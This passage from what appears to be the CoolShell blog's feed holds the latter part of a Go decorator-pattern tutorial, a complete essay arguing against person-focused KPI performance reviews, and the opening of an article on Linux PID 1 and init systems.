    return func(s string) {
        fmt.Println("Started")
        f(s)
        fmt.Println("Done")
    }
}

func Hello(s string) {
    fmt.Println(s)
}

func main() {
        decorator(Hello)("Hello, World!")
}</pre>
<p>我们可以看到，我们动用了一个高阶函数 <code>decorator()</code>，在调用的时候，先把 <code>Hello()</code> 函数传进去，然后其返回一个匿名函数，这个匿名函数中除了运行了自己的代码，也调用了被传入的 <code>Hello()</code> 函数。</p>
<p>这个玩法和 Python 的异曲同工，只不过，有些遗憾的是，Go 并不支持像 Python 那样的 <code>@decorator</code> 语法糖。所以，在调用上有些难看。当然，如果你要想让代码容易读一些，你可以这样：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">hello := decorator(Hello)
hello("Hello")</pre>
<p>我们再来看一个和计算运行时间的例子：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="16-26">package main

import (
  "fmt"
  "reflect"
  "runtime"
  "time"
)

type SumFunc func(int64, int64) int64

func getFunctionName(i interface{}) string {
  return runtime.FuncForPC(reflect.ValueOf(i).Pointer()).Name()
}

func timedSumFunc(f SumFunc) SumFunc {
  return func(start, end int64) int64 {

    defer func(t time.Time) {
      fmt.Printf("--- Time Elapsed (%s): %v ---\n", 
          getFunctionName(f), time.Since(t))
    }(time.Now())

    return f(start, end)
  }
}

func Sum1(start, end int64) int64 {
  var sum int64
  sum = 0
  if start &gt; end {
    start, end = end, start
  }
  for i := start; i &lt;= end; i++ {
    sum += i
  }
  return sum
}

func Sum2(start, end int64) int64 {
  if start &gt; end {
    start, end = end, start
  }
  return (end - start + 1) * (end + start) / 2
}

func main() {

  sum1 := timedSumFunc(Sum1)
  sum2 := timedSumFunc(Sum2)

  fmt.Printf("%d, %d\n", sum1(-10000, 10000000), sum2(-10000, 10000000))
}</pre>
<p>关于上面的代码，有几个事说明一下：</p>
<p>1）有两个 Sum 函数，<code>Sum1()</code> 函数就是简单的做个循环，<code>Sum2()</code> 函数动用了数据公式。（注意：start 和 end 有可能有负数的情况）</p>
<p>2）代码中使用了 Go 语言的反射机器来获取函数名。</p>
<p>3）修饰器函数是 <code>timedSumFunc()</code></p>
<p>运行后输出：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ go run time.sum.go
--- Time Elapsed (main.Sum1): 3.557469ms ---
--- Time Elapsed (main.Sum2): 291ns ---
49999954995000, 49999954995000
</pre>
<h4>
<span class="ez-toc-section" id="HTTP_%E7%9B%B8%E5%85%B3%E7%9A%84%E4%B8%80%E4%B8%AA%E7%A4%BA%E4%BE%8B"></span>HTTP 相关的一个示例<span class="ez-toc-section-end"></span>
</h4>
<p>我们再来看一个处理 HTTP 请求的相关的例子。</p>
<p>先看一个简单的 HTTP Server 的代码。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="10-16,24">package main

import (
    "fmt"
    "log"
    "net/http"
    "strings"
)

func WithServerHeader(h http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        log.Println("---&gt;WithServerHeader()")
        w.Header().Set("Server", "HelloServer v0.0.1")
        h(w, r)
    }
}

func hello(w http.ResponseWriter, r *http.Request) {
    log.Printf("Recieved Request %s from %s\n", r.URL.Path, r.RemoteAddr)
    fmt.Fprintf(w, "Hello, World! "+r.URL.Path)
}

func main() {
    http.HandleFunc("/v1/hello", WithServerHeader(hello))
    err := http.ListenAndServe(":8080", nil)
    if err != nil {
        log.Fatal("ListenAndServe: ", err)
    }
}</pre>
<p>上面代码中使用到了修饰模式，<code>WithServerHeader()</code> 函数就是一个 Decorator，其传入一个 <code>http.HandlerFunc</code>，然后返回一个改写的版本。上面的例子还是比较简单，用 <code>WithServerHeader()</code> 就可以加入一个 Response 的 Header。</p>
<p>于是，这样的函数我们可以写出好些个。如下所示，有写 HTTP 响应头的，有写认证 Cookie 的，有检查认证Cookie的，有打日志的……</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="60-62">package main

import (
    "fmt"
    "log"
    "net/http"
    "strings"
)

func WithServerHeader(h http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        log.Println("---&gt;WithServerHeader()")
        w.Header().Set("Server", "HelloServer v0.0.1")
        h(w, r)
    }
}

func WithAuthCookie(h http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        log.Println("---&gt;WithAuthCookie()")
        cookie := &amp;http.Cookie{Name: "Auth", Value: "Pass", Path: "/"}
        http.SetCookie(w, cookie)
        h(w, r)
    }
}

func WithBasicAuth(h http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        log.Println("---&gt;WithBasicAuth()")
        cookie, err := r.Cookie("Auth")
        if err != nil || cookie.Value != "Pass" {
            w.WriteHeader(http.StatusForbidden)
            return
        }
        h(w, r)
    }
}

func WithDebugLog(h http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        log.Println("---&gt;WithDebugLog")
        r.ParseForm()
        log.Println(r.Form)
        log.Println("path", r.URL.Path)
        log.Println("scheme", r.URL.Scheme)
        log.Println(r.Form["url_long"])
        for k, v := range r.Form {
            log.Println("key:", k)
            log.Println("val:", strings.Join(v, ""))
        }
        h(w, r)
    }
}
func hello(w http.ResponseWriter, r *http.Request) {
    log.Printf("Recieved Request %s from %s\n", r.URL.Path, r.RemoteAddr)
    fmt.Fprintf(w, "Hello, World! "+r.URL.Path)
}

func main() {
    http.HandleFunc("/v1/hello", WithServerHeader(WithAuthCookie(hello)))
    http.HandleFunc("/v2/hello", WithServerHeader(WithBasicAuth(hello)))
    http.HandleFunc("/v3/hello", WithServerHeader(WithBasicAuth(WithDebugLog(hello))))
    err := http.ListenAndServe(":8080", nil)
    if err != nil {
        log.Fatal("ListenAndServe: ", err)
    }
}</pre>
<h4>
<span class="ez-toc-section" id="%E5%A4%9A%E4%B8%AA%E4%BF%AE%E9%A5%B0%E5%99%A8%E7%9A%84_Pipeline"></span>多个修饰器的 Pipeline<span class="ez-toc-section-end"></span>
</h4>
<p>在使用上，需要对函数一层层的套起来，看上去好像不是很好看，如果需要 decorator 比较多的话，代码会比较难看了。嗯，我们可以重构一下。</p>
<p>重构时，我们需要先写一个工具函数——用来遍历并调用各个 decorator：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">type HttpHandlerDecorator func(http.HandlerFunc) http.HandlerFunc

func Handler(h http.HandlerFunc, decors ...HttpHandlerDecorator) http.HandlerFunc {
    for i := range decors {
        d := decors[len(decors)-1-i] // iterate in reverse
        h = d(h)
    }
    return h
}</pre>
<p>然后，我们就可以像下面这样使用了。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">http.HandleFunc("/v4/hello", Handler(hello,
                WithServerHeader, WithBasicAuth, WithDebugLog))</pre>
<p>这样的代码是不是更易读了一些？pipeline 的功能也就出来了。</p>
<h4>
<span class="ez-toc-section" id="%E6%B3%9B%E5%9E%8B%E7%9A%84%E4%BF%AE%E9%A5%B0%E5%99%A8"></span>泛型的修饰器<span class="ez-toc-section-end"></span>
</h4>
<p>不过，对于 Go 的修饰器模式，还有一个小问题 —— 好像无法做到泛型，就像上面那个计算时间的函数一样，其代码耦合了需要被修饰的函数的接口类型，无法做到非常通用，如果这个事解决不了，那么，这个修饰器模式还是有点不好用的。</p>
<p>因为 Go 语言不像 Python 和 Java，Python是动态语言，而 Java 有语言虚拟机，所以他们可以干好些比较变态的事，然而 Go 语言是一个静态的语言，这意味着其类型需要在编译时就要搞定，否则无法编译。不过，Go 语言支持的最大的泛型是 <code>interface{}</code> 还有比较简单的 reflection 机制，在上面做做文章，应该还是可以搞定的。</p>
<p>废话不说，下面是我用 reflection 机制写的一个比较通用的修饰器（为了便于阅读，我删除了出错判断代码）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="7,10">func Decorator(decoPtr, fn interface{}) (err error) {
    var decoratedFunc, targetFunc reflect.Value

    decoratedFunc = reflect.ValueOf(decoPtr).Elem()
    targetFunc = reflect.ValueOf(fn)

    v := reflect.MakeFunc(targetFunc.Type(),
            func(in []reflect.Value) (out []reflect.Value) {
                fmt.Println("before")
                out = targetFunc.Call(in)
                fmt.Println("after")
                return
            })

    decoratedFunc.Set(v)
    return
}</pre>
<p>上面的代码动用了 <code>reflect.MakeFunc()</code> 函数制出了一个新的函数其中的 <code>targetFunc.Call(in)</code> 调用了被修饰的函数。关于 Go 语言的反射机制，推荐官方文章 —— 《<a href="https://blog.golang.org/laws-of-reflection" target="_blank" rel="noopener noreferrer">The Laws of Reflection</a>》，在这里我不多说了。</p>
<p>上面这个 <code>Decorator()</code> 需要两个参数，</p>
<ul>
<li>第一个是出参 <code>decoPtr</code> ，就是完成修饰后的函数</li>
<li>第二个是入参 <code>fn</code> ，就是需要修饰的函数</li>
</ul>
<p>这样写是不是有些二？的确是的。不过，这是我个人在 Go 语言里所能写出来的最好的的代码了。如果你知道更多优雅的，请你一定告诉我！</p>
<p>好的，让我们来看一下使用效果。首先假设我们有两个需要修饰的函数：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">func foo(a, b, c int) int {
    fmt.Printf("%d, %d, %d \n", a, b, c)
    return a + b + c
}

func bar(a, b string) string {
    fmt.Printf("%s, %s \n", a, b)
    return a + b
}</pre>
<p>然后，我们可以这样做：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">type MyFoo func(int, int, int) int
var myfoo MyFoo
Decorator(&amp;myfoo, foo)
myfoo(1, 2, 3)
</pre>
<p>你会发现，使用 <code>Decorator()</code> 时，还需要先声明一个函数签名，感觉好傻啊。一点都不泛型，不是吗？</p>
<p>嗯。如果你不想声明函数签名，那么你也可以这样</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">mybar := bar
Decorator(&amp;mybar, bar)
mybar("hello,", "world!")</pre>
<p>好吧，看上去不是那么的漂亮，但是 it works。看样子 Go 语言目前本身的特性无法做成像 Java 或 Python 那样，对此，我们只能多求 Go 语言多放糖了！</p>
<p>Again， 如果你有更好的写法，请你一定要告诉我。</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-06-01T16:48:15+08:00</pubDate>
<guid>https://coolshell.cn/articles/17929.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 我看绩效考核 ]]></title>
<link>https://coolshell.cn/articles/17972.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >（本来，这篇文章应该在5月份完成，我拖延症让我今天才完成）</p>
<p>前些天，有几个网友找我谈绩效考核的事，都是在绩效上被差评的朋友。在大致了解情况后，我发现他们感到沮丧和郁闷的原因，不全是自己没有做好事情，他们对于自己没有做好公司交给的事，一方面，持一些疑义，因为我很明显地感到他们和公司对一件是否做好的标准定义有误差，另一方面，他们对于自己的工作上的问题也承认。不过，让他们更多感到沮丧的原因则是，公司、经理或HR和他们的谈话，让他们感觉整个人都被完全否定了，甚至有一种被批斗的感觉。这个感觉实在是太糟糕了。</p>
<p>因为我也有相似的经历，所以，我想在这里写下一篇文章，谈谈自己的对一些绩效考核的感受。先放出我的两个观点：</p>
<p style="padding-left: 30px;"><strong>1）制定目标和绩效，目的不是用来考核人的，而用来改善提高组织和人员业绩和效率的。</strong></p>
<p style="padding-left: 30px;"><strong>2）人是复杂的，人是有状态波动的，任何时候都不应该轻易否定人，绩效考核应该考核的是事情，而不是人。</strong></p>
<p>我个人比较坚持的认为——<strong>绩效分应该打给项目，打给产品，打给部门，打给代码，而不是打给人。</strong>然而现在的管理体制基本上都是打给人，而很多根本不擅长管理的经理和HR以及很多不会独立思考的吃瓜群众基本上都会把矛头指向个人，所以，当然会有开批斗会的感觉。</p>
<p><span id="more-17972"></span></p>
<p> </p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%BE%E5%87%A0%E4%B8%AA%E4%BE%8B%E5%AD%90" title="举几个例子">举几个例子</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E5%AF%B9%E5%85%AC%E5%8F%B8%E5%92%8C%E7%AE%A1%E7%90%86%E8%80%85%E6%83%B3%E8%AF%B4%E7%9A%84%E8%AF%9D" title="对公司和管理者想说的话">对公司和管理者想说的话</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%AF%B9%E8%81%8C%E5%9C%BA%E4%BA%BA%E6%83%B3%E8%AF%B4%E7%9A%84%E8%AF%9D" title="对职场人想说的话">对职场人想说的话</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%BE%E5%87%A0%E4%B8%AA%E4%BE%8B%E5%AD%90"></span>举几个例子<span class="ez-toc-section-end"></span>
</h4>
<p>为了讲清楚我的上述观点，请让我先铺垫一下，先说几个例子吧，韩寒的例子我就不说了。</p>
<p style="padding-left: 30px;">苏步青同学在小学时成绩很糟糕，全班倒数第一。</p>
<p style="padding-left: 30px;">华罗庚同学上学时数学还考不及格，要不是王维克老师的鼓励并让他爱上了数学，他可能也就完全埋没了。</p>
<p style="padding-left: 30px;">郑渊洁上学时，老师要求写《早起的鸟有虫子吃》，郑渊洁唱反调写《早起的虫子被鸟吃》，再加上数学老师发难，于是被开除了。从此郑渊洁没有上过一天学。</p>
<p style="padding-left: 30px;">列夫尔斯泰大贵族出身，2岁丧母，9岁丧父，16岁上大学，大学三年级自动退学回家进行改革。在青年时期不好好读书，考试不及格，留级。他赌博、借债、鬼混……</p>
<p>这个的例子太多了，我从另一个方面举几个体育运动相关的例子，可能年轻的朋友都不知道，可以问问你们的父母。</p>
<p style="padding-left: 30px;">80年代，中国有一批非常优秀的体育运动员，比如：体操王子李宁，打破过世界跳高记录的朱建华，还有乒乓球世界冠军马文革，还有羽毛球世界冠军赵建华，记得有一年参加世界比赛，他们全输了，而输的还很惨。于是国内的一些媒体和民众开始骂他们，甚至说他们是民族的败类、耻辱，还有很多人找上门要教训他们……</p>
<p>如果我们把绩效分比做在学校里的考试分，那么你是否会和我一样认为，考试的成绩只能代表这个人对这些知识点的掌握或理解，而且仅仅在这个时间点，根本不代表这个人根本就不行，更不代表他一直不行。因为挂科太多被学校开除的同学，并不见得这些人在社会上就无活生活下去，反而，他们中的有些人可能会考试成绩好的人还活得好。不是么？这样的例子在我们身边还少吗？</p>
<p>所以，当我看到某HR说某老员工——“他今天要不自己离开，未来一年也一定会因为绩效问题而被公司开了的”，除了感到居然有人类可以预知他人未来的可笑之外，我感到是一种悲哀，一种管理体制上的悲哀，我感到了在这HR考评背后一股非常强的暗流和不可见的力量让她干出了这样一件匪夷所思的事。</p>
<p>好些公司还考评价值观，价值观无可厚非，<strong>我觉得一个企业的价值观是非常必要的，但是考核价值观是件非常危险的事情。</strong>这个世界上和传统势力唱反调的人实在是太多了，而被定性为价值观有问题被迫害的人也是多了去了。被批斗被侮辱被毒打的老舍；因为同性恋问题，被迫害而自杀的图灵；因为不同意教会观点被监禁8年都不愿意放弃自己的信仰最终被烧死的布鲁诺，…… 这样的事情已经够多了，新的时代里不应该再发生这样的事了，无论大小。</p>
<p>考核价值观最大的问题就是非常容易的上纲上线，也非常容易的被制造政治斗争，也非常容易的扼杀各种不同思想，老实说，这从很大程度上是一种洗脑的手段——通过对人制造一种紧张或恐惧而达到控制思想的目的。</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%AF%B9%E5%85%AC%E5%8F%B8%E5%92%8C%E7%AE%A1%E7%90%86%E8%80%85%E6%83%B3%E8%AF%B4%E7%9A%84%E8%AF%9D"></span>对公司和管理者想说的话<span class="ez-toc-section-end"></span>
</h4>
<p>下面我来谈谈绩效考核我的一些观点。在谈这个观点前，你可以移步看一下这篇新闻报道——《<a href="http://tech.qq.com/a/20120614/000196.htm" target="_blank" rel="noopener noreferrer">绩效主义毁了索尼</a>》。而近年来，“放弃绩效考核”的斗争已经从科技企业中的Adobe、戴尔、微软、亚马逊，席卷到德勤、埃森哲、普华永道等咨询服务类企业。甚至通用电气（GE）——曾经的绩效管理的鼻祖，也宣布抛弃正式的年度绩效考核。在刚过去的2016年，腾讯的张小龙对微信事业群发出“警惕KPI”的呼声；李彦宏在内部信中将百度的掉队归咎于“从管理层到员工对短期KPI的追逐”；雷军干脆宣布小米“继续坚持‘去KPI’的战略，放下包袱，解掉绳索，开开心心地做事。”；王石也在个人微博中感慨：“绩效主义像企业的脓包”。</p>
<p>绩效考核在本质上就是像学校教育以分数论英雄，而忽略员工的成长和素质教育是一个道理。当学生和老师只关注考试分数时，而只有考试分数来评价老师和学生的优良中差时，老师和学生就会开始使用一些非常形式的方式来达到这个目标，比如：死记硬被，记套路，题海战术…… 而学习的能力的考评彻底地沦为了一种形式主义。反而，分数考的越高，脑子越死。（注：美国现行教育是不允许通过学生考试成绩来评价老师的能力的）</p>
<p>近几年来，一些大公司开始使用 OKR – Objectives, Key Result ，但是在实践过程中，我发现好些公司用OKR，本质上还是KPI – Key Performance Indicator， 因为OKR里面有一个Key Result，用来衡量 Objectives 的结果指标。于是，使用者习惯性的设置上了KPI。<strong>我个人认为 OKR 有三个非常大的特性：0）由员工提出，1）以目标为导向。2）全员共享。</strong></p>
<p>举个例子，OKR可能会是制定成下面这个样子的：</p>
<p style="padding-left: 30px;">Objectives：增强用户体验，</p>
<p style="padding-left: 30px;">Key Results：</p>
<p style="padding-left: 60px;">1）用户操作步骤减少20%以上，</p>
<p style="padding-left: 60px;">2）客服减少40%以上工单，</p>
<p style="padding-left: 60px;">3）用户99.9%的系统操作的响应时间为100ms以下</p>
<p style="padding-left: 30px;">然后，把这个目标分解给产品、用户体验、技术团队，形成子的Objectives并关连上相应的父级的Key Result，比如，产品部门定义的Objectives：1）优化注册流程，减少2个步骤，2）优化红包算法，让用户更容易理解，3）提高商品质量，减少用户投诉。后端技术团队定义的Objectives： 1）定义SLA以及相关监控指标，2）自动化运维，减少故障恢复时间，3）提高性能，吞吐量在xxxqps下的99.9%的响应时间为xxms ……</p>
<p>这个Objective会从公司最高层一直分解到一线员工，信息完全透明，每个人都可以看到所有人被分解到目标，每个人都知道自己在为什么样的目标而奋头，而每个人也可以质疑，改进，建议调整最高层的目标和方向。而不是领到的是被层层消化过的变味的二手，三手甚至四五手的信息。</p>
<p><strong>而 KPI 最大的问题就是用 OKR 里的 Key Results 拿来当目标，从而导致员工只知道要做什么，不知道为什么，不知道为什么，不能理解目标，工作也就成了实实在在的应付！</strong></p>
<p>松下公司早在1933年，就召集168名员工，把松下未来250年的远景规划目标公布于众，从1956年开始，就定期宣布并解读自身的“五年计划”，帮助每位员工的目光从眼前的短期利益移开，树立自己的理想和目标，也促进了松下的可持续性发展。</p>
<p>然而，今时不同往昔，随着产品周期的不断缩减、竞争对手的持续涌入、高新技术的频频迭代，企业的战略的变化与调整变得更加频繁，朝令夕改的经营策略已经成为兵家常态。 在这一过程中，有多少员工了解调整之后的战略呢？员工的绩效指标又根据战略调整多少次了呢？</p>
<p><strong>KPI本身是一种被动的、后置的考察，在工作完成之后考察员工的行为是否符合标准。因此，员工对于公司的目标漠不关心，只关心自己的KPI，因为这才是自己的最大的利益，为了达到KPI，有的员工开始不思考，并使用一些简单粗暴的玩法，其实这样既害了公司，也害了自己。自己的成长和进步也因为强大的 KPI 而抛在了脑后。</strong></p>
<p><strong>当然，KPI 绩效考核一般来说，不一定会毁掉公司的，相反，对于喜欢使用蛮力的劳动密集型的公司来说，可能还有所帮助，然而，KPI毁掉的一定是团队的文化和团队的挑战精神，以及创新和对事业的热情，甚至会让其中的人失去应有的正常的判断力（分不清充分和必要条件，分不清很多事的因果关系）。</strong></p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%AF%B9%E8%81%8C%E5%9C%BA%E4%BA%BA%E6%83%B3%E8%AF%B4%E7%9A%84%E8%AF%9D"></span>对职场人想说的话<span class="ez-toc-section-end"></span>
</h4>
<p>那么，对于个人来说，如何面对公司给自己的绩效考核呢？如何面对他们的绩效考核呢？</p>
<p>还是用学校考试分数来做对比，如果说，用考试分数论英雄，一个人考高分就是绩效上的人才，考不及格的人就是人渣，这对吗？当然不是。也许仅于对于考试来说可以把人分成三六九等，但是对于整个人生来说，考试成绩和一个人在这个社会里的的成就并没有非常直接的因果关系。面对现实的社会，最终很多成绩好的人为成绩差的人工作的例子也有很多很多了。</p>
<p>我想说什么？我想说的是——<strong>用一颗平常心来面对公司给你打的分数，因为那并不代表你的整个人生。但是，你要用一颗非常严肃的心来面对自己的个人发展和成长，因为这才是真正需要认真对待的事。</strong></p>
<p>换句话说，<strong>如果要给一个人打绩效分，那不是由一个公司在一个短期的时间时打出来，而是由这个人在一个长期的时间里所能达到的成就得出来的。</strong></p>
<p>就像WhatsApp的联合创始人Brian Acton 在 2009年时面试Facebook时没有面试通过，然而在 5 年以后，他把自己创办的公司以190亿美元卖给了FaceBook。阿里巴巴的马云不也一样吗？找工作各种被拒，开办的第一个公司成绩也不好，20年前，一堆人都说马云这也不行那也不行，然而，后面呢？反过来说，也很多职业经理人在公司里绩效非常好，然后到了创业公司却搞得非常的糟糕，这又说明了什么呢？</p>
<p>这就像动物一样，有的动物适合在水里生活，有的动物适合在陆地上，鱼在陆地上是无法生存的，你让老虎去完成游泳的工作，你让鱼去完成鸟类的工作，你能考核到什么呢？<strong>我们每个人都有适合自己的环境，找到适合自己的环境才是最关键的！与其去关注别人对自己的评价，不如去寻找适合自己的环境。</strong></p>
<p>所以，<strong>一个特定环境下的绩效考核并不代表什么，而那些妄图用绩效考核去否定一个人的做法，或多或少就是“法西斯”或“红卫兵”的玩法</strong>。</p>
<p>好了！让我们不要再说绩效考核了，让我们回到，真正让自己提高，让自己成长，让自己的强的话题上来吧。这里，我需要转引一篇文章《<a href="https://brendansterne.com/2013/07/11/do-the-right-thing-wait-to-get-fired/" target="_blank" rel="noopener noreferrer">Do the Right Thing, Wait to get fired</a>》，文中提到《 <a href="https://www.amazon.cn/gp/product/1449302440" target="_blank" rel="noopener noreferrer">Team Geek</a>》这本书中的一句话</p>
<blockquote>
<p><strong>做正确的事情，等着被开除。</strong></p>
<p>谷歌新员工(我们称做“Nooglers”)经常会问我是如何让自己做事这么高效的。我半开玩笑的告诉他们这很简单：<strong>我选择做正确的事情，为谷歌，为世界，然后回到座位上，等着被开除。如果没有被开除，那我就是做了正确的事情——为所有人。如果被开除了，那选错了老板。总之，两方面，我都是赢</strong>。这是我的职业发展策略。</p>
</blockquote>
<p>注明一下，“做正确的事，等着被开除”并不是一句鸡汤，而是让你变强大的话。因为强者自强，只有强者才能追求真理，而不是委曲求全。</p>
<p>嗯，<strong>考试分数不是关键，别人对你的评价也不是关键，自己有没有成长有没有提高有没有上一个台阶才是关键。KPI不是关键，OKR也不是关键，有没有在做正确的事，这才是关键！</strong>不是这样吗？</p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83"></span>其它<span class="ez-toc-section-end"></span>
</h4>
<p>我大学四年级时，觉得马上就要离开学校了，当时想干点以后再以没有机会干的事。想来想去，就是上学这么多年来，从来没有不及格过，于是我任性了一把，挂了一个科，去补考了一下。挂科的时候也收到一些同学的笑话，还有老师的批评，不过，这让我感觉我的学校经历更完整了。因为，这让我在22岁的时候，就经历并大概明白了一些人生的道理。</p>
<p>从98年工作到2013年来，就像一个好学生一样，我从来没有出现过任何的工作绩效问题，反正还经常在工作中成为标杠型的人，然并卵，只有自己成长才是最真实的感觉。“做正确的事，等着被开除”，这可能是我迄今为止在职场里做的最疯狂也是最正确的事了。因为，这让我有更多的经历，让我从正确的事中得到提高，也让我内心变得越来越强大，也让我找到了更具挑战的事，更让我对自己有更清楚的认识。</p>
<p>最后，我知道一定会有人来怼我，所以，最后我还想留段话，留给那些还是想通过绩效来否定人的人。</p>
<p style="padding-left: 30px;">如果你对我的绩效或技术能力有怀疑，没问题，那么希望你能做到下述我已做到的事，再来喷我，谢谢！</p>
<p style="padding-left: 30px;">“<strong>在你40岁，在父亲病重，孩子上学问题、房贷并未还清、你是全家唯一收入来源之类的中年危机的情况下，辞去你现在的工作，不加入任何一家公司，不用自己的任何一分钱积蓄，不要任何人的投资和帮助。只通过自己的技术能力，为别人解决相应的技术难题（不做任何无技术含量的外包项目），来生存养家，并除了能照顾好自己的家人没有降低自己的生活水平之外，还能再养活3个每人年薪36万元的工程师</strong>”</p>
<p style="padding-left: 30px;">请问这样的绩效能打个几分呢？呵呵。</p>
<p>当然，不管怎么说，我还有很多路要走，还有很多不足，我还要继续努力。所以，我挑了一条对我来说最难走的路，作死创业……</p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2017-07-09T18:03:00+08:00</pubDate>
<guid>https://coolshell.cn/articles/17972.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Linux PID 1 和 Systemd ]]></title>
<link>https://coolshell.cn/articles/17998.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >要说清 Systemd，得先从Linux操作系统的启动说起。Linux 操作系统的启动首先从 BIOS 开始，然后由 Boot Loader 载入内核，并初始化内核。内核初始化的最后一步就是启动 init 进程。这个进程是系统的第一个进程，PID 为 1，又叫超级进程，也叫根进程。它负责产生其他所有用户进程。所有的进程都会被挂在这个进程下，如果这个进程退出了，那么所有的进程都被 kill 。如果一个子进程的父进程退了，那么这个子进程会被挂到 PID 1 下面。（注：PID 0 是内核的一部分，主要用于内进换页，参看：<a href="https://en.wikipedia.org/wiki/Process_identifier" target="_blank" rel="noopener noreferrer">Process identifier</a>）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#SysV_Init" title="SysV Init">SysV Init</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#UpStart" title="UpStart">UpStart</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Systemd" title="Systemd">Systemd</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Systemd_%E4%BA%89%E8%AE%BA%E5%92%8C%E5%85%AB%E5%8D%A6" title="Systemd 争论和八卦">Systemd 争论和八卦</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%85%B6%E5%AE%83" title="其它">其它</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%BB%B6%E4%BC%B8%E9%98%85%E8%AF%BB" title="延伸阅读">延伸阅读</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="SysV_Init"></span>SysV Init<span class="ez-toc-section-end"></span>
</h4>
<p>PID 1 这个进程非常特殊，其主要就任务是把整个操作系统带入可操作的状态。比如：启动 UI – Shell 以便进行人机交互，或者进入 X 图形窗口。传统上，PID 1 和传统的 Unix System V 相兼容的，所以也叫 <code>sysvinit</code>，这是使用得最悠久的 init 实现。Unix System V 于1983年 release。</p>
<p>在 <code>sysvint</code> 下，有好几个运行模式，又叫 <code>runlevel</code>。比如：常见的 3 级别指定启动到多用户的字符命令行界面，5 级别指定启起到图形界面，0 表示关机，6 表示重启。其配置在 <code>/etc/inittab</code> 文件中。</p>
<p><span id="more-17998"></span></p>
<p>与此配套的还有 <code>/etc/init.d/</code> 和 <code>/etc/rc[X].d</code>，前者存放各种进程的启停脚本（需要按照规范支持 <code>start</code>，<code>stop</code>子命令），后者的 X 表示不同的 runlevel 下相应的后台进程服务，如：<code>/etc/rc3.d</code> 是 runlevel=3 的。 里面的文件主要是 link 到  <code>/etc/init.d/</code> 里的启停脚本。其中也有一定的命名规范：S 或 K 打头的，后面跟一个数字，然后再跟一个自定义的名字，如：<code>S01rsyslog</code>，<code>S02ssh</code>。S 表示启动，K表示停止，数字表示执行的顺序。</p>
<h4>
<span class="ez-toc-section" id="UpStart"></span>UpStart<span class="ez-toc-section-end"></span>
</h4>
<p>Unix 和 Linux 在 <code>sysvint</code> 运作多年后，大约到了2006年的时候，Linux内核进入2.6时代，Linux有了很多更新。并且，Linux开始进入桌面系统，而桌面系统和服务器系统不一样的是，桌面系统面临频繁重启，而且，用户会非常频繁的使用硬件的热插拔技术。于是，这些新的场景，让 <code>sysvint</code> 受到了很多挑战。</p>
